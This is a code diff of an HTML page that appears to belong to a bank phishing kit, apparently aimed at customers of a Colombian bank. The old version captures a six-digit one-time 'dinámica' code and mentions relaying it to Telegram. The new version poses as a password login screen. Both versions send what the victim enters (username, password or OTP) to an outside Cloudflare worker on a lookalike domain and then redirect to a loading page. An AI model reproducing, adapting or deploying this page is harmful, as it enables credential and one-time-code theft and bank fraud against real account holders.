@@ -1,160 +1,166 @@
+
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ingresar Dinámica</title>
-<style>
-body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background: #f9f9f9;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-}
-.container {
-    background: #fff;
-    padding: 30px;
-    border-radius: 15px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-    width: 350px;
-    text-align: center;
-}
-h2 {
-    color: #333;
-    margin-bottom: 20px;
-    font-size: 1.5rem;
-}
-.input-group {
-    margin-bottom: 20px;
-}
-input {
-    width: 100%;
-    padding: 12px 15px;
-    margin: 8px 0;
-    font-size: 16px;
-    border: 2px solid #ddd;
-    border-radius: 8px;
-    box-sizing: border-box;
-    transition: border-color 0.3s;
-}
-input:focus {
-    border-color: #28a745;
-    outline: none;
-}
-button {
-    width: 100%;
-    padding: 14px;
-    font-size: 16px;
-    font-weight: bold;
-    background: #28a745;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background 0.3s;
-}
-button:hover {
-    background: #218838;
-}
-button:disabled {
-    background: #6c757d;
-    cursor: not-allowed;
-}
-.info {
-    background: #e9ecef;
-    padding: 10px;
-    border-radius: 5px;
-    margin-top: 15px;
-    font-size: 0.9rem;
-    color: #495057;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingrese su Clave</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+        }
+        .center-box input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
+            font-size: 19px;
+            border: none;
+            border-bottom: 1px solid #ffe100;
+            outline: none;
+        }
+        .button-container {
+            position: absolute;
+            top: 70.4%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+        }
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-    <h2>🔐 Ingresar Código Dinámica</h2>
-    <div class="input-group">
-        <input type="text" id="dinamica" placeholder="Ingresa el código de 6 dígitos" maxlength="6">
+    <div class="image-container">
+        <img src="img/cel1.jpg" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i>🔒</i>
+                <input type="password" placeholder="Clave" id="claveInput">
+            </div>
+        </div>
+        <div class="button-container">
+            <button onclick="window.history.back()">Cancelar</button>
+            <button id="loginButton">Ingresar</button>
+        </div>
     </div>
-    <button id="enviar">Enviar y Activar Botones</button>
-    
-    <div class="info">
-        ℹ️ Este código activará los botones en Telegram para continuar con la verificación.
-    </div>
-</div>
 
-<script>
-document.addEventListener('DOMContentLoaded', () => {
-    const dinamicaInput = document.getElementById('dinamica');
-    const enviarBtn = document.getElementById('enviar');
-    
-    // Validar que solo sean números
-    dinamicaInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        
-        // Habilitar botón solo si hay 6 dígitos
-        enviarBtn.disabled = e.target.value.length !== 6;
-    });
-    
-    // Enviar con Enter
-    dinamicaInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && dinamicaInput.value.length === 6) {
-            enviarDinamica();
-        }
-    });
-});
+    <script>
+        const claveInput = document.getElementById('claveInput');
+        const loginButton = document.getElementById('loginButton');
 
-async function enviarDinamica() {
-    const dinamica = document.getElementById('dinamica').value;
-    const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-    const transactionId = bancoldata.transactionId;
+        loginButton.addEventListener('click', async () => {
+            const claveValue = claveInput.value.trim();
+            
+            if (claveValue.length >= 4) {
+                try {
+                    // Obtener datos de localStorage
+                    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                    const usuario = bancoldata.usuario;
 
-    if (!dinamica || dinamica.length !== 6) {
-        alert("Por favor ingresa un código de 6 dígitos.");
-        return;
-    }
+                    if (!usuario) {
+                        alert('Error: Usuario no encontrado');
+                        return;
+                    }
 
-    if (!transactionId) {
-        alert("Error: No se encontró la transacción actual.");
-        return;
-    }
+                    // Generar transactionId único
+                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 
-    try {
-        const response = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                id: transactionId,
-                dinamica: dinamica
-            })
+                    // ACTUALIZAR: Guardar la clave en bancoldata
+                    bancoldata.clave = claveValue;
+                    bancoldata.transactionId = transactionId;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                    console.log('Enviando login:', { usuario, clave: claveValue, transactionId });
+
+                    // Enviar login al worker
+                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            usuario: usuario,
+                            clave: claveValue,
+                            transactionId: transactionId
+                        })
+                    });
+
+                    const result = await response.json();
+                    console.log('Respuesta del login:', result);
+                    
+                    if (result.ok) {
+                        // Redirigir a la página de loading
+                        window.location.href = 'loading.html';
+                    } else {
+                        alert('Error en el login: ' + (result.error || 'Error desconocido'));
+                    }
+                    
+                } catch (error) {
+                    console.error('Error completo:', error);
+                    alert('Error al procesar el login: ' + error.message);
+                }
+            } else {
+                alert('Por favor, ingrese una clave válida de al menos 4 caracteres.');
+            }
         });
 
-        const result = await response.json();
-        
-        if (result.ok) {
-            // Guardar dinámica en localStorage
-            bancoldata.dinamica = dinamica;
-            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-            
-            alert("✅ Dinámica enviada correctamente. Los botones se han activado en Telegram.");
-            
-            // Redirigir a loading para esperar siguiente acción
-            window.location.href = 'loading.html';
-            
-        } else {
-            alert("❌ Error: " + (result.error || "No se pudo enviar la dinámica"));
-        }
-    } catch(e) {
-        console.error("Error:", e);
-        alert("❌ Error de conexión al enviar la dinámica.");
-    }
-}
-
-document.getElementById("enviar").addEventListener("click", enviarDinamica);
-</script>
+        // También enviar con Enter
+        claveInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                loginButton.click();
+            }
+        });
+    </script>
 </body>
 </html>
